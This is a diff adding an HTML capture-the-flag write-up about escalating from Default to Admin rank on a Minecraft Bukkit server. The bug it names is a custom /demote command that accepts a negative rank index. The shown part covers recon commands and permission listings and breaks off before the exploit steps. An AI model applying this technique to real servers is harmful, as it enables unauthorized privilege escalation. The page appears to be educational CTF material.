@@ -1,0 +1,1583 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>PERMISSIONDENIED // MINECRAFT PERM UNDERFLOW</title>
+<meta name="description" content="OmniCTF 2026 // permissiondenied writeup // Signed-int underflow in a custom Minecraft demote plugin. Bukkit plugin exploit via negative rank index.">
+<meta name="theme-color" content="#c4ff3a">
+<link rel="icon" href="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' fill='%23020100'/><text x='50%25' y='58%25' font-family='monospace' font-weight='800' font-size='18' text-anchor='middle' fill='%23c4ff3a'>P</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Rajdhani:wght@500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  /* ==========================================================================
+     TORCH-inspired cyberdeck palette (same as the Kant writeup)
+     ========================================================================== */
+  :root {
+    --accent: #c4ff3a;
+    --accent-rgb: 196, 255, 58;
+    --accent-dim: rgba(196, 255, 58, 0.12);
+    --accent-line: rgba(196, 255, 58, 0.28);
+    --root: #ff3030;
+    --bg: #020100;
+    --panel: rgba(5, 5, 5, 0.76);
+    --panel-strong: rgba(8, 7, 6, 0.94);
+    --line: rgba(196, 255, 58, 0.28);
+    --text: #e8e0d5;
+    --muted: #7f766a;
+    --good: #5aedff;
+    --bad: #ff5a5a;
+    --info: #6bb6ff;
+    --mc-green: #55ff55;
+    --mc-gray: #aaaaaa;
+    --mc-yellow: #ffff55;
+    --mc-red: #ff5555;
+    --mc-gold: #ffaa00;
+    --mc-aqua: #55ffff;
+    --font-mono: "JetBrains Mono", ui-monospace, Menlo, monospace;
+    --font-display: "Rajdhani", system-ui, sans-serif;
+  }
+
+  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font-mono);
+    font-size: 15px;
+    line-height: 1.6;
+    overflow-x: hidden;
+    min-height: 100vh;
+    background-image:
+      radial-gradient(1200px 600px at 12% -10%, rgba(196, 255, 58,0.10), transparent 60%),
+      radial-gradient(900px 500px at 110% 10%, rgba(255,48,48,0.06), transparent 70%),
+      repeating-linear-gradient(0deg, rgba(196, 255, 58,0.025) 0 1px, transparent 1px 3px);
+  }
+  ::selection { background: var(--accent); color: #000; }
+
+  /* HUD bar */
+  .hud {
+    position: sticky; top: 0; z-index: 50;
+    display: grid; grid-template-columns: auto 1fr auto;
+    gap: 12px; align-items: center;
+    padding: 10px 18px;
+    background: linear-gradient(180deg, rgba(8,7,6,0.96), rgba(8,7,6,0.78));
+    border-bottom: 1px solid var(--accent-line);
+    backdrop-filter: blur(8px);
+  }
+  .hud .brand {
+    display: flex; align-items: center; gap: 10px;
+    font-family: var(--font-display); font-weight: 800; font-size: 20px;
+    letter-spacing: 0.18em; color: var(--accent);
+    text-shadow: 0 0 12px rgba(196, 255, 58,0.35);
+  }
+  .hud .brand .mark {
+    display: inline-grid; place-items: center;
+    width: 28px; height: 28px;
+    border: 1.5px solid var(--accent);
+    box-shadow: 0 0 12px rgba(196, 255, 58,0.4) inset, 0 0 12px rgba(196, 255, 58,0.2);
+    font-size: 14px;
+  }
+  .hud .nav { display: flex; gap: 14px; flex-wrap: wrap; justify-content: center; }
+  .hud .nav a {
+    font-family: var(--font-display); font-weight: 700; font-size: 12px;
+    letter-spacing: 0.22em; color: var(--text);
+    text-decoration: none; padding: 4px 8px;
+    border-bottom: 1px solid transparent;
+    transition: color .15s, border-color .15s;
+  }
+  .hud .nav a:hover { color: var(--accent); border-color: var(--accent); }
+  .hud .nav a.active { color: var(--accent); border-color: var(--accent); }
+  .hud .status { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+  .chip {
+    font-family: var(--font-display); font-weight: 700; font-size: 10px;
+    letter-spacing: 0.18em; padding: 4px 8px;
+    border: 1px solid var(--accent-line);
+    background: var(--accent-dim); color: var(--text);
+    text-transform: uppercase; white-space: nowrap;
+  }
+  .chip.ok { color: var(--good); border-color: rgba(90,237,255,0.4); background: rgba(90,237,255,0.08); }
+  .chip.bad { color: var(--bad); border-color: rgba(255,90,90,0.4); background: rgba(255,90,90,0.08); }
+  .chip.info { color: var(--info); border-color: rgba(107,182,255,0.4); background: rgba(107,182,255,0.08); }
+  .chip .dot {
+    display: inline-block; width: 6px; height: 6px; border-radius: 50%;
+    background: currentColor; margin-right: 6px; vertical-align: middle;
+    box-shadow: 0 0 8px currentColor;
+  }
+
+  /* Hero / brief */
+  .brief {
+    max-width: 1180px;
+    margin: 28px auto 12px;
+    padding: 0 18px;
+    display: grid; grid-template-columns: 1.4fr 1fr; gap: 18px;
+  }
+  @media (max-width: 880px) { .brief { grid-template-columns: 1fr; } }
+  .panel {
+    position: relative;
+    background: var(--panel);
+    border: 1px solid var(--accent-line);
+    padding: 18px 20px;
+    backdrop-filter: blur(4px);
+  }
+  .panel::before {
+    content: "";
+    position: absolute; top: 0; left: 0; right: 0; height: 1px;
+    background: linear-gradient(90deg, transparent, var(--accent), transparent);
+  }
+  .panel h1 {
+    font-family: var(--font-display); font-weight: 800;
+    letter-spacing: 0.16em; font-size: 36px;
+    margin: 0 0 6px; color: var(--accent); text-transform: uppercase;
+  }
+  .panel .sub {
+    color: var(--muted); font-size: 12px; letter-spacing: 0.22em;
+    text-transform: uppercase; margin-bottom: 14px;
+  }
+  .panel p { margin: 0 0 12px; }
+  .panel p.lede { font-size: 16px; }
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px 18px; }
+  .grid-2 .row { display: flex; justify-content: space-between; gap: 8px; font-size: 13px; }
+  .grid-2 .k { color: var(--muted); letter-spacing: 0.14em; text-transform: uppercase; font-size: 11px; }
+  .grid-2 .v { color: var(--text); font-weight: 500; }
+  .grid-2 .v.accent { color: var(--accent); }
+  .grid-2 .v.good { color: var(--good); }
+  .grid-2 .v.bad { color: var(--bad); }
+
+  main { max-width: 1180px; margin: 0 auto; padding: 0 18px 60px; }
+  section { margin: 24px 0; }
+  .sec-head {
+    display: flex; align-items: baseline; gap: 12px;
+    border-bottom: 1px dashed var(--accent-line);
+    padding-bottom: 8px; margin-bottom: 14px;
+  }
+  .sec-head .idx {
+    font-family: var(--font-display); font-weight: 800;
+    font-size: 12px; letter-spacing: 0.24em; color: var(--accent);
+  }
+  .sec-head h2 {
+    font-family: var(--font-display); font-weight: 800;
+    letter-spacing: 0.16em; font-size: 22px;
+    text-transform: uppercase; margin: 0; color: var(--text);
+  }
+  .sec-head .tag {
+    margin-left: auto; font-size: 10px; color: var(--muted);
+    letter-spacing: 0.18em; text-transform: uppercase;
+  }
+
+  /* Content typography */
+  .prose p { margin: 0 0 12px; }
+  .prose p + p { margin-top: 0; }
+  .prose strong { color: var(--accent); font-weight: 600; }
+  .prose code, .prose tt {
+    font-family: var(--font-mono); font-size: 13px;
+    background: rgba(196, 255, 58,0.06);
+    border: 1px solid rgba(196, 255, 58,0.12);
+    padding: 1px 5px; color: #e8ffb8;
+  }
+  .prose blockquote {
+    margin: 12px 0; padding: 8px 14px;
+    border-left: 2px solid var(--accent);
+    background: rgba(196, 255, 58,0.04); color: #d6cebf;
+  }
+  .prose .mc-line {
+    font-family: var(--font-mono); font-size: 13px;
+    margin: 2px 0;
+  }
+  .prose .mc-line .mc-cmd { color: var(--mc-aqua); }
+  .prose .mc-line .mc-arg { color: var(--mc-yellow); }
+  .prose .mc-line .mc-ok { color: var(--mc-green); }
+  .prose .mc-line .mc-fail { color: var(--mc-red); }
+  .prose .mc-line .mc-warn { color: var(--mc-gold); }
+  .prose .mc-line .mc-out { color: var(--mc-gray); }
+  .prose .mc-line .mc-fl { color: var(--good); font-weight: 700; }
+
+  /* "Thinking" panel: solver's in-the-moment reasoning */
+  .think {
+    border: 1px dashed rgba(107, 182, 255, 0.4);
+    background: rgba(107, 182, 255, 0.04);
+    padding: 10px 14px; margin: 10px 0;
+    font-size: 13.5px; color: #c7dcf2;
+  }
+  .think::before {
+    content: "// THINKING //";
+    display: block; color: var(--info);
+    font-family: var(--font-display); font-weight: 800;
+    letter-spacing: 0.22em; font-size: 10px; margin-bottom: 6px;
+  }
+  .think .line { padding-left: 0; margin: 0; }
+  .think .line::before { content: "> "; color: var(--info); }
+  .think .line + .line { margin-top: 4px; }
+
+  /* "Failed attempt" asides */
+  .aside-fail {
+    border: 1px solid rgba(255, 90, 90, 0.35);
+    background: linear-gradient(180deg, rgba(255,90,90,0.06), rgba(255,90,90,0.02));
+    padding: 10px 14px; margin: 12px 0;
+    font-size: 13.5px; color: #e3c7c7;
+  }
+  .aside-fail .aside-head {
+    display: block; color: #ff7a7a;
+    font-family: var(--font-display); font-weight: 800;
+    letter-spacing: 0.22em; font-size: 10px;
+    margin-bottom: 6px; text-transform: uppercase;
+  }
+  .aside-fail p { margin: 0 0 8px; }
+  .aside-fail p:last-child { margin-bottom: 0; }
+  .aside-fail p:first-of-type { color: #ffd9d9; }
+
+  /* Live Minecraft chat simulator */
+  .sim {
+    border: 1px solid var(--accent-line);
+    background: #1a0f00; /* warm dark */
+    margin: 14px 0 6px;
+    display: grid; grid-template-rows: auto 1fr auto;
+    position: relative;
+  }
+  .sim::before {
+    content: "";
+    position: absolute; inset: 0; pointer-events: none;
+    background-image:
+      repeating-linear-gradient(
+        0deg,
+        rgba(255,255,255,0.012) 0 1px,
+        transparent 1px 4px
+      );
+    z-index: 1;
+  }
+  .sim .head {
+    position: relative; z-index: 2;
+    display: flex; align-items: center; gap: 10px;
+    padding: 8px 12px;
+    border-bottom: 1px solid var(--accent-line);
+    background: rgba(0,0,0,0.4);
+    font-size: 11px; color: var(--muted);
+    letter-spacing: 0.18em; text-transform: uppercase;
+  }
+  .sim .head .dots { display: flex; gap: 5px; }
+  .sim .head .dots span { width: 8px; height: 8px; border-radius: 50%; background: var(--accent); opacity: 0.5; }
+  .sim .head .dots span:nth-child(1) { opacity: 0.3; }
+  .sim .head .dots span:nth-child(3) { opacity: 0.8; }
+  .sim .head .title { color: var(--accent); font-weight: 700; }
+  .sim .head .rank { margin-left: auto; }
+  .sim .body {
+    position: relative; z-index: 2;
+    padding: 10px 14px;
+    font-family: var(--font-mono);
+    font-size: 12.5px; line-height: 1.55;
+    color: #d6cebf;
+    min-height: 320px; max-height: 460px;
+    overflow: auto;
+  }
+  .sim .body .line {
+    display: block; margin: 0;
+    white-space: pre-wrap;
+    word-wrap: break-word;
+    padding: 1px 4px;
+    border-left: 2px solid transparent;
+    animation: lineIn 0.25s ease-out both;
+  }
+  .sim .body .line:hover { background: rgba(255,255,255,0.04); }
+  .sim .body .line .mc-cmd { color: var(--mc-aqua); }
+  .sim .body .line .mc-arg { color: var(--mc-yellow); }
+  .sim .body .line .mc-ok { color: var(--mc-green); }
+  .sim .body .line .mc-fail { color: var(--mc-red); }
+  .sim .body .line .mc-warn { color: var(--mc-gold); }
+  .sim .body .line .mc-out { color: var(--mc-gray); }
+  .sim .body .line .mc-fl { color: var(--good); font-weight: 700; text-shadow: 0 0 8px rgba(90,237,255,0.4); }
+  .sim .body .line.system { color: var(--mc-gold); font-style: italic; }
+  .sim .body .line.banner {
+    color: var(--accent); text-transform: uppercase;
+    letter-spacing: 0.14em; font-weight: 700;
+    padding: 4px 4px;
+    border-left-color: var(--accent);
+  }
+  .sim .body .cursor {
+    display: inline-block; color: var(--text);
+    animation: blink 1s steps(1) infinite;
+  }
+  @keyframes lineIn { from { opacity: 0; transform: translateX(-4px); } to { opacity: 1; transform: translateX(0); } }
+
+  .sim .controls {
+    position: relative; z-index: 2;
+    display: flex; gap: 8px; flex-wrap: wrap;
+    padding: 8px 12px;
+    border-top: 1px solid var(--accent-line);
+    background: rgba(0,0,0,0.4);
+    align-items: center;
+  }
+  .sim .controls input {
+    flex: 1; min-width: 200px;
+    background: #020100; color: var(--text);
+    border: 1px solid var(--accent-line);
+    padding: 6px 10px;
+    font-family: var(--font-mono);
+    font-size: 12.5px;
+  }
+  .sim .controls input:focus { outline: none; border-color: var(--accent); }
+  .sim button {
+    background: var(--accent); color: #000; border: none;
+    padding: 7px 16px;
+    font-family: var(--font-display); font-weight: 800;
+    font-size: 11px; letter-spacing: 0.22em; text-transform: uppercase;
+    cursor: pointer; transition: filter .15s;
+  }
+  .sim button:hover { filter: brightness(1.15); }
+  .sim button.ghost {
+    background: transparent; color: var(--accent);
+    border: 1px solid var(--accent-line);
+  }
+  .sim .controls .meta {
+    font-size: 10px; color: var(--muted);
+    letter-spacing: 0.18em; text-transform: uppercase;
+    padding: 0 6px;
+  }
+  .sim .controls .meta.bad { color: var(--bad); }
+  .sim .controls .meta.ok { color: var(--good); }
+
+  /* Quick-pick command palette */
+  .cmd-palette {
+    display: flex; flex-wrap: wrap; gap: 6px;
+    margin: 6px 0 0;
+  }
+  .cmd-palette button {
+    background: rgba(255,255,255,0.04);
+    color: var(--text);
+    border: 1px solid var(--accent-line);
+    padding: 4px 10px;
+    font-family: var(--font-mono);
+    font-size: 11.5px; letter-spacing: 0;
+    text-transform: none;
+    font-weight: 400;
+  }
+  .cmd-palette button:hover {
+    background: var(--accent-dim);
+    color: var(--accent);
+    border-color: var(--accent);
+  }
+
+  /* Connection map (reused structure) */
+  .map-legend {
+    display: flex; flex-wrap: wrap; gap: 12px;
+    margin-top: 10px;
+    font-size: 11px; color: var(--muted);
+    letter-spacing: 0.12em; text-transform: uppercase;
+  }
+  .map-legend .item { display: inline-flex; align-items: center; gap: 6px; }
+  .map-legend .swatch { width: 12px; height: 12px; border: 1px solid var(--accent-line); }
+
+  /* Recovered flag panel */
+  .result {
+    border: 1px solid var(--good);
+    background: linear-gradient(180deg, rgba(90,237,255,0.08), rgba(90,237,255,0.02));
+    padding: 16px 20px; margin: 14px 0;
+  }
+  .result .label {
+    font-family: var(--font-display); font-weight: 800;
+    letter-spacing: 0.22em; color: var(--good);
+    font-size: 11px; margin-bottom: 6px;
+  }
+  .result .flag-text {
+    font-family: var(--font-mono);
+    font-size: 18px; color: var(--accent);
+    word-break: break-all;
+    text-shadow: 0 0 14px rgba(196, 255, 58,0.35);
+  }
+
+  /* Decorative hex stream */
+  .hex-stream {
+    font-family: var(--font-mono); font-size: 10px;
+    color: var(--muted);
+    letter-spacing: 0.12em; opacity: 0.5;
+    padding: 6px 18px;
+    white-space: nowrap;
+    overflow: hidden;
+  }
+  .hex-stream.top { border-top: 1px solid var(--accent-line); margin-top: 18px; }
+  .hex-stream .hex-track {
+    display: inline-block; white-space: nowrap;
+    animation: hexScroll 40s linear infinite;
+    padding-left: 100%;
+  }
+  @keyframes hexScroll { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
+
+  /* Animations */
+  @keyframes pulseDot {
+    0%, 100% { opacity: 1; box-shadow: 0 0 4px currentColor; }
+    50%      { opacity: 0.55; box-shadow: 0 0 12px currentColor; }
+  }
+  .chip .dot { animation: pulseDot 1.8s ease-in-out infinite; }
+  @keyframes pulseOk {
+    0%, 100% { box-shadow: 0 0 0 rgba(90,237,255,0); }
+    50%      { box-shadow: 0 0 10px rgba(90,237,255,0.35); }
+  }
+  .chip.ok { animation: pulseOk 2.4s ease-in-out infinite; }
+  @keyframes scanSweep {
+    0%   { background-position: 0 0, 0 0, 0 0; }
+    100% { background-position: 0 0, 0 0, 0 6px; }
+  }
+  body { animation: scanSweep 6s linear infinite; }
+  @keyframes fadeInUp {
+    from { opacity: 0; transform: translateY(8px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  .sec-head { animation: fadeInUp 0.5s ease-out both; }
+  .think { animation: fadeInUp 0.45s ease-out both; }
+  @keyframes breath {
+    0%, 100% { box-shadow: 0 0 0 rgba(90,237,255,0), inset 0 0 0 rgba(90,237,255,0); }
+    50%      { box-shadow: 0 0 22px rgba(90,237,255,0.25), inset 0 0 18px rgba(90,237,255,0.06); }
+  }
+  .result { animation: breath 3.4s ease-in-out infinite; }
+
+  /* Connection map (reused interactivity) */
+  /* Badges for sim rank, etc */
+  .rank-badge {
+    display: inline-block;
+    padding: 1px 6px;
+    border: 1px solid var(--accent-line);
+    background: var(--accent-dim);
+    font-size: 10px; letter-spacing: 0.16em; text-transform: uppercase;
+    color: var(--accent);
+  }
+  .rank-badge.admin {
+    color: var(--mc-red); border-color: var(--mc-red);
+    background: rgba(255,85,85,0.08);
+    text-shadow: 0 0 6px rgba(255,85,85,0.5);
+  }
+
+  /* Bottom HUD strip */
+  footer.foot {
+    max-width: 1180px; margin: 30px auto 0;
+    padding: 14px 18px 30px;
+    border-top: 1px solid var(--accent-line);
+    display: flex; flex-wrap: wrap; gap: 12px; justify-content: space-between; align-items: center;
+    font-size: 11px; color: var(--muted);
+    letter-spacing: 0.18em; text-transform: uppercase;
+  }
+  footer.foot .meta { display: flex; gap: 14px; flex-wrap: wrap; }
+
+  /* Reduce motion */
+  @media (prefers-reduced-motion: reduce) {
+    .blink, .chip .dot, .chip.ok, .result, .think, .sec-head, .hex-stream,
+    .sim .body .line, }
+
+  .map-wrap rect.pack { fill: rgba(var(--accent-rgb), 0.02); stroke: var(--accent-line); stroke-width: 1; rx: 5; ry: 5; }
+  .map-wrap text.pack-label { fill: var(--accent); font: 700 9px 'Rajdhani', sans-serif; letter-spacing: .24em; text-transform: uppercase; }
+  .map-wrap text.col-label { fill: var(--muted); font: 700 10px 'Rajdhani', sans-serif; letter-spacing: .18em; text-transform: uppercase; }
+  .map-wrap g.node { cursor: pointer; }
+  .map-wrap g.node rect { fill: rgba(var(--accent-rgb), 0.06); stroke: var(--accent); stroke-width: 1.5; transition: all .2s; }
+  .map-wrap g.node:hover rect { filter: drop-shadow(0 0 8px rgba(var(--accent-rgb), .45)); fill: rgba(var(--accent-rgb), 0.1); }
+  .map-wrap g.node.active rect { stroke-width: 2.5; filter: drop-shadow(0 0 12px rgba(var(--accent-rgb), .7)); fill: rgba(var(--accent-rgb), 0.15); }
+  .map-wrap g.node text.head { fill: var(--muted); font: 700 9px 'Rajdhani', sans-serif; letter-spacing: .18em; text-transform: uppercase; }
+  .map-wrap g.node text.title { fill: var(--accent); font: 700 12px 'Rajdhani', sans-serif; letter-spacing: .12em; text-transform: uppercase; }
+  .map-wrap g.node text.body { fill: var(--text); font: 11px 'JetBrains Mono', monospace; }
+  .map-wrap g.node text.label { fill: var(--muted); font: 9px 'JetBrains Mono', monospace; letter-spacing: .14em; }
+  .map-wrap path.edge { stroke: var(--accent); stroke-width: 1.2; fill: none; opacity: 0.85; marker-end: url(#arr); transition: stroke .3s, opacity .3s; }
+  .map-wrap path.edge.faint { stroke: var(--edge-faint, #8a7e96); stroke-width: 1; fill: none; opacity: 0.5; stroke-dasharray: 3 3; marker-end: url(#arr-faint); }
+  .map-wrap text.edge-label { fill: var(--muted); font: 9px 'JetBrains Mono', monospace; letter-spacing: .14em; text-transform: uppercase; pointer-events: none; }
+  .map-wrap marker path { transition: fill .3s; }
+  .map-wrap path.edge.flowing { stroke: var(--accent); stroke-width: 1.8; opacity: 1; stroke-dasharray: 6 4; animation: flowDash .6s linear infinite; }
+  .map-wrap path.edge.faint.flowing { stroke: var(--accent-dim, #b86bff99); stroke-dasharray: 4 3; }
+  .map-wrap { overflow: hidden; }
+  .map-wrap svg { display:block; width:100%; height:auto; }
+  .map-wrap { width:100%; overflow-x:auto; overflow-y:visible; }
+  .map-wrap { overflow-x:auto; overflow-y:visible; -webkit-overflow-scrolling:touch; }
+  .map-wrap svg { display: block; width: 100%; height: auto; }
+  #map-info, .node-info { margin-top: 10px; padding: 0 14px; border: 1px solid var(--accent-line); background: rgba(var(--accent-rgb), 0.04); font-size: 13px; color: var(--text); max-height: 0; overflow: hidden; opacity: 0; transition: max-height .3s, opacity .2s, padding .25s; line-height: 1.5; }
+  #map-info.show, .node-info.show { max-height: 400px; opacity: 1; padding: 10px 14px; }
+  #map-info .mi-hd { display: flex; align-items: center; gap: 10px; }
+  #map-info .mi-ti { font-family: var(--font-display); font-weight: 800; letter-spacing: .14em; text-transform: uppercase; color: var(--accent); font-size: 11px; }
+  #map-info .mi-tg { margin-left: auto; font-size: 10px; padding: 2px 6px; border: 1px solid var(--accent-line); color: var(--muted); background: rgba(0,0,0,.3); }
+  #map-info .mi-cl { background: transparent; color: var(--muted); border: 1px solid var(--accent-line); padding: 2px 8px; font-family: var(--font-display); font-weight: 700; font-size: 9px; letter-spacing: .14em; text-transform: uppercase; cursor: pointer; }
+  #map-info .mi-cl:hover { color: var(--accent); border-color: var(--accent); }
+  #map-info .mi-bd { margin-top: 6px; word-wrap: break-word; }
+  @keyframes blink { 50% { opacity: 0; } }
+  @keyframes flowDash { to { stroke-dashoffset: -10; } }
+</style>
+</head>
+<body>
+
+<!-- ============================================================
+     TOP HUD
+     ============================================================ -->
+<header class="hud" role="banner">
+  <div class="brand">
+    <span class="mark">P</span>
+    <span>PERMISSIONDENIED // WRITEUP</span>
+  </div>
+  <nav class="nav" aria-label="Sections">
+    <a href="#brief">brief</a>
+    <a href="#triage">triage</a>
+    <a href="#recon">recon</a>
+    <a href="#exploit">exploit</a>
+    <a href="#sim">sim</a>
+    <a href="#signal">signal</a>
+    <a href="#flag">flag</a>
+  </nav>
+  <div class="status">
+    <span class="chip ok"><span class="dot"></span>flag recovered</span>
+    <span class="chip info"><span class="dot"></span>bukkit plugin</span>
+    <span class="chip"><span class="dot"></span>omni 2026</span>
+  </div>
+</header>
+
+<!-- ============================================================
+     HERO / BRIEF
+     ============================================================ -->
+<section class="brief" id="brief">
+  <div class="panel">
+    <div class="sub">// root // challenge 06 // omnictf 2026</div>
+    <h1>Permissiondenied: minecraft perm underflow</h1>
+    <p class="lede">A public Minecraft server, two custom plugins, and a tiny off-by-one in the demote command's index parser. The plugin author "didn't want the perms to be broken." That's the hint.</p>
+    <p>What I actually do: read the in-game book, ask the server what plugins it has, look at the perms a default-rank player has, notice the asymmetry, then throw a negative number at the demote command until something breaks.</p>
+    <div class="row-flex" style="margin-top:10px">
+      <span class="chip ok"><span class="dot"></span>flag recovered</span>
+      <span class="chip"><span class="dot"></span>1.21.11 bukkit</span>
+      <span class="chip"><span class="dot"></span>custom plugin exploit</span>
+      <span class="chip bad"><span class="dot"></span>negative index bypass</span>
+    </div>
+  </div>
+  <div class="panel">
+    <div class="sub">// challenge matrix</div>
+    <div class="grid-2">
+      <div class="row"><span class="k">endpoint</span><span class="v">play.omnictf.com:25606</span></div>
+      <div class="row"><span class="k">version</span><span class="v">minecraft 1.21.11</span></div>
+      <div class="row"><span class="k">server</span><span class="v">bukkit (not paper)</span></div>
+      <div class="row"><span class="k">plugins</span><span class="v">CTFhandler, GroupManager</span></div>
+      <div class="row"><span class="k">fake flag</span><span class="v bad">CTFhandler /flag gated on admin</span></div>
+      <div class="row"><span class="k">vuln</span><span class="v bad">/demote accepts negative index</span></div>
+      <div class="row"><span class="k">approach</span><span class="v">read perms, find asymmetry, try negatives</span></div>
+      <div class="row"><span class="k">time to solve</span><span class="v">~10 min of poking</span></div>
+      <div class="row"><span class="k">core idea</span><span class="v">if demote has no promote, demote probably is the promote</span></div>
+      <div class="row"><span class="k">remote result</span><span class="v good">OmniCTF{...} printed by /flag</span></div>
+    </div>
+  </div>
+</section>
+
+<main>
+
+<!-- ============================================================
+     01 // TRIAGE
+     ============================================================ -->
+<section id="triage">
+  <div class="sec-head">
+    <span class="idx">01 //</span>
+    <h2>first contact, read the book and count the plugins</h2>
+    <span class="tag">phase / recon</span>
+  </div>
+  <div class="panel prose">
+    <p>Ok so I open the IP <code>play.omnictf.com:25606</code> in Minecraft 1.21.11 and join. I spawn into a small lobby. There's a book in my inventory. The book is the first real clue. In CTF challenges, free text the game gives you before you do anything is almost always a hint.</p>
+
+    <p>The book talks about plugins and that the server owner "didn't want the perms to be broken." Two takeaways: there's custom stuff on the server, and the security model is permissions. Both point at the plugins.</p>
+
+    <p>First thing I try is <code>/plugins</code>. That's the vanilla Bukkit/Spigot command to list installed plugins:</p>
+
+    <div class="mc-line"><span class="mc-out">[Server]</span> Bukkit Plugins: <span class="mc-ok">CTFhandler</span>, <span class="mc-ok">GroupManager</span></div>
+
+    <p>Two plugins. <code>CTFhandler</code> is obviously the flag-gating plugin (the challenge name is "permissiondenied", the prefix is CTF, the tip says an auth plugin is unrelated). <code>GroupManager</code> is the classic EssentialsX perm plugin for Bukkit servers. It handles ranks and perms.</p>
+
+    <p>The tip also says the server is <strong>Bukkit, not Paper</strong>. That matters more than it looks. Paper added a bunch of stricter command parsing and disabled a lot of older Bukkit-isms. Knowing it's Bukkit means I can use a few of the older command formats directly.</p>
+
+    <div class="think">
+      <div class="line">"Perms not to be broken" = the security model is the GroupManager permissions. The custom demote plugin is a good place to start poking because (a) the title is literally "permissiondenied" and (b) demote affects rank.</div>
+      <div class="line">The flag-gating plugin is CTFhandler. The flag is almost certainly printed when an admin runs <code>/flag</code>. I need admin.</div>
+      <div class="line">Bukkit (not Paper) means I can use <code>/bukkit:&lt;plugin&gt;</code> to query plugin internals. GroupManager has a few well-known commands for listing groups and perms.</div>
+    </div>
+
+    <div class="aside-fail">
+      <span class="aside-head">// the first thing I tried that didn't work</span>
+      <p>I almost spent five minutes trying to use <code>/version</code> to dig into the plugin metadata. It does print the plugin list with version strings and authors, but it doesn't tell you what commands each plugin registers. The writeup I was referencing later said the same thing: <code>/version</code> is "not as useful because it doesn't tell me about the commands each plugin has." The actual path is to ask Bukkit directly.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     02 // RECON: THE BUKKIT:$ TRICK
+     ============================================================ -->
+<section id="recon">
+  <div class="sec-head">
+    <span class="idx">02 //</span>
+    <h2>recon: the bukkit:$ trick and groupmanager commands</h2>
+    <span class="tag">phase / recon</span>
+  </div>
+  <div class="panel prose">
+    <p>On a Bukkit server, there's a hidden command format you can use to interrogate any plugin: <code>/bukkit:&lt;plugin&gt;</code>. It falls through to the plugin's own command handler, which for GroupManager prints the help text.</p>
+
+    <div class="mc-line"><span class="mc-cmd">/bukkit:$</span> <span class="mc-arg">groupmanager</span></div>
+    <div class="mc-line"><span class="mc-out">---------- Help: GroupManager ----------</span></div>
+    <div class="mc-line"><span class="mc-out">Below is a list of all GroupManager commands:</span></div>
+    <div class="mc-line"><span class="mc-ok">/manglist</span><span class="mc-out">: Lists all groups available.</span></div>
+    <div class="mc-line"><span class="mc-ok">/manglistp</span><span class="mc-out">: Lists all permissions of a group.</span></div>
+
+    <p>Two commands. I run <code>/manglist</code> first:</p>
+
+    <div class="mc-line"><span class="mc-cmd">/manglist</span></div>
+    <div class="mc-line"><span class="mc-out">Groups available:</span></div>
+    <div class="mc-line"><span class="mc-ok">&nbsp;&nbsp;Admin, Builder, Default, Helper, Limited, Moderator, Prisoner, Restricted</span></div>
+
+    <p>Eight groups, ordered bottom-to-top: Prisoner (0) &rarr; Restricted (1) &rarr; Limited (2) &rarr; Default (3) &rarr; Builder (4) &rarr; Helper (5) &rarr; Moderator (6) &rarr; Admin (7). The <code>/demote</code> help text I see later confirms this index mapping.</p>
+
+    <p>I'm currently <code>Default</code> (rank 3, the lobby default). The challenge is to get to Admin (rank 7). I run <code>/manglistp default</code> to see what permissions a default-rank player actually has:</p>
+
+    <div class="mc-line"><span class="mc-cmd">/manglistp default</span></div>
+    <div class="mc-line"><span class="mc-out">The group 'Default' has the following permissions:</span></div>
+    <div class="mc-line"><span class="mc-fail">-bukkit.command.kill</span><span class="mc-out">,</span> <span class="mc-fail">-essentials.*</span><span class="mc-out">,</span> <span class="mc-fail">-pluginhider.*</span><span class="mc-out">,</span></div>
+    <div class="mc-line"><span class="mc-ok">bukkit.command.plugins</span><span class="mc-out">,</span> <span class="mc-warn">customdemotion.demote</span><span class="mc-out">,</span> <span class="mc-ok">groupmanager.manglist</span><span class="mc-out">,</span> <span class="mc-ok">groupmanager.manglistp</span></div>
+    <div class="mc-line"><span class="mc-out">And all permissions from groups: g:groupmanager_default, g:bukkit_default, g:essentials_default</span></div>
+
+    <p>Four things I notice in this list:</p>
+    <ol>
+      <li>The <code>-</code> prefix means "explicitly denied", so Essentials and the kill command are turned off. That's normal for a default rank.</li>
+      <li><code>bukkit.command.plugins</code> is the only granted vanilla Bukkit command. That's how I listed the plugins earlier.</li>
+      <li><code>groupmanager.manglist</code> and <code>groupmanager.manglistp</code> are granted, which is why I can inspect perms at all.</li>
+      <li><strong><code>customdemotion.demote</code></strong>. A custom plugin called CustomDemotion has granted the default group a demote permission. There is no matching <code>customdemotion.promote</code>.</li>
+    </ol>
+
+    <div class="think">
+      <div class="line">Why is demote granted to default but not promote? In a normal server, a default-rank player shouldn't be able to demote themselves OR promote themselves. Granting demote alone is weird.</div>
+      <div class="line">Two possibilities: (a) the demote is meant to be self-only and the plugin handles it safely, or (b) the demote command is the way you change rank in this server, full stop, and the only question is which direction you can go.</div>
+      <div class="line">If (b), there are two sub-possibilities. The demote command might be a one-way trip down the ladder (with a hardcoded check that prevents upward moves), or it might just be "set your rank to &lt;index&gt;" with the author having only tested it with downward values.</div>
+      <div class="line">Time to read the demote help text and try things.</div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     03 // EXPLOIT: NEGATIVE INDEX UNDERFLOW
+     ============================================================ -->
+<section id="exploit">
+  <div class="sec-head">
+    <span class="idx">03 //</span>
+    <h2>the exploit: negative indices and signed underflow</h2>
+    <span class="tag">phase / exploit</span>
+  </div>
+  <div class="panel prose">
